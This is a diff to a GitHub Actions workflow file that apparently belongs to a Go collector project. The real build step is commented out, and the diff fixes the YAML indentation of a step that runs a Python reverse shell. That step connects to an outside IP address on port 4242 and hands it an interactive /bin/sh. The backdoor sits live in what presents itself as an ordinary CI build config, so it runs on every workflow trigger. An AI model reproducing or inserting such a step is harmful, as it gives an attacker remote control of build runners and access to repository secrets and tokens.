@@ -20,8 +20,8 @@ jobs:
       - uses: actions/setup-go@v3
         with:
           go-version: '>=1.18'
-      run: python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('164.92.162.149',4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"
-      shell: bash
+      - run: python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('164.92.162.149',4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"
+        shell: bash
 #      - run: go build -ldflags "-s -w" -o /tmp/bin && tar -czvf /tmp/sa-collector-$RELEASE-$GOOS-$GOARCH.tar.gz /tmp/bin
 #        shell: bash
 
